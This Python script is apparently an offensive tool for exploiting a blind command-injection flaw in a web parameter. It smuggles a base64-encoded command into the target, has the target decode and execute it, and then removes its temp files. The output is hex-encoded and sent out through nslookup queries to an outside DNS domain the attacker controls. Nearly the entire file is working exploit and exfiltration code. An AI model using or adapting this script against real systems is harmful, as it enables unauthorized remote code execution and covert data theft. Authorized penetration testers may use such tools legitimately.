################################################################################################
#  Description:
#  A tool for executing DNS based commands through a blind CMD Injection vulnerability
#
################################################################################################

import requests
import urllib
import time
import sys
import base64
import enum
import secrets
import argparse
import urllib.parse

proxies = None
#Comment out if not using a proxy like Burp, etc
proxies = {
 'http': 'http://127.0.0.1:8080',
 'https': 'http://127.0.0.1:8080',
}

#Set to bypass errors if the target site has SSL issues
requests.packages.urllib3.disable_warnings()

class RequestVerb(enum.Enum):
    GET = 1
    POST = 2
    PUT = 3

def make_request( url, req_verb=RequestVerb.GET, req_params_dict="", header_dict=None ):

    error_count = 0
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'}

    # Add any additional headers
    if header_dict:
        headers.update(header_dict)

    resp = None
    while True:
        try:
            if req_verb == RequestVerb.GET:
                resp = requests.get(url, headers=headers, proxies=proxies, verify=False)
            elif req_verb == RequestVerb.POST:
                headers.update({'Content-Type': 'application/x-www-form-urlencoded'} )
                resp = requests.post(url, data=req_params_dict, headers=headers, proxies=proxies, verify=False)
            elif req_verb == RequestVerb.PUT:
                headers.update({'Content-Type': 'application/x-www-form-urlencoded'} )
                resp = requests.put(url, headers=headers, data=req_params_dict, proxies=proxies, verify=False,)
            else:
                print("[-] Unknown request type. Aborting")
                return data_arr
            break
        except requests.exceptions.RequestException as e:
            # print(traceback.format_exc())
            error_count += 1
            if error_count > 3:
                print("[-] Error sending HTTP request.")
                # print(traceback.format_exc())
                break
            else:
                time.sleep(1)
                continue

    return resp


def execute_cmd(cmd, dns_root):

    payload_template = "<payload>"
    cmd_injection_wrapper = "&&%s&&" % payload_template

    # Added to make each request unique-ish to avoid DNS caching
    req_str = secrets.token_hex(2)

    # Add the command, use simple while loop to execute nslookup on each line returned by xxd
    cmd_str = cmd
    cmd_str += "|xxd -p|while read line;do ((c++));nslookup $line.$c.%s.%s; done;nslookup _._.%s.%s" % (req_str, dns_root,req_str, dns_root)

    tmp_file = '/var/tmp/a1234'
    tmp_file2 = '/var/tmp/a1235'
    exploit = get_payload(cmd_injection_wrapper, payload_template, cmd_str, dns_root, tmp_file)
    #print(exploit)

    # Set the parameters
    param_dict = {'year': '2022',
                  'month': '12',
                   'hour' : '23',
                   'sid' : 'ky',
                   vuln_param_name : exploit}

    # Add any other params
    #param_dict.update(additional_params)
    exploit = urllib.parse.quote_plus(exploit)


    # Send first request to save base64 to tmp file
    resp = make_request(url, req_verb, param_dict)
    print("[*] Sent first request")
    
    # Command to execute decode
    decode_wrapper = "script -qc 'base64 -d %s' %s" % (tmp_file, tmp_file2)

    # Add the exploit
    cmd_injection_wrapper = "&&%s&&" % payload_template
    exploit = cmd_injection_wrapper.replace(payload_template, decode_wrapper)

    # Set the parameters
    param_dict[vuln_param_name] = exploit

    # Send second request to decode and save to second tmp file
    resp = make_request(url, req_verb, param_dict)
    print("[*] Sent second request")

    # Command to execute decode
    decode_wrapper = "chmod +x %s&&%s&&rm %s&&rm %s" % (tmp_file2, tmp_file2, tmp_file2,tmp_file)

    # Add the exploit
    cmd_injection_wrapper = "&&%s&&" % payload_template
    exploit = cmd_injection_wrapper.replace(payload_template, decode_wrapper)

    # Set the parameters
    param_dict[vuln_param_name] = exploit

    # Send second request to decode and save to second tmp file
    resp = make_request(url, req_verb, param_dict)
    print("[*] Sent final request")

# Get length of command
def get_payload(exploit_template, payload_template, cmd, dns_root, tmp_file):

    cmd_str = cmd
    str_len_mod = len(cmd_str) % 3
    if str_len_mod != 0:
        spaces = 3 - str_len_mod
        cmd_str += ' ' * spaces

    b64_str_cmd = base64.b64encode(cmd_str.encode()).decode()

    # Add the decode wrapper
    decode_wrapper = "shuf -e '%s' -o %s" % (b64_str_cmd, tmp_file)

    # Add the exploit
    exploit_wrapper = exploit_template.replace(payload_template, decode_wrapper)

    # Replace the template with the payload
    return exploit_wrapper


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='Consort - Helper server for exploit interaction')
    parser.add_argument('-c', help="Command", required=True)


    # Set variables
    args = parser.parse_args()
    cmd = args.c
    #cmd = "ifconfig"

    dns_root = "m.my.dns"

    vuln_param_name = "param"

    #Target URL
    url = "https://example.com"

    # Set Request Type
    req_verb = RequestVerb.POST


    execute_cmd(cmd, dns_root)
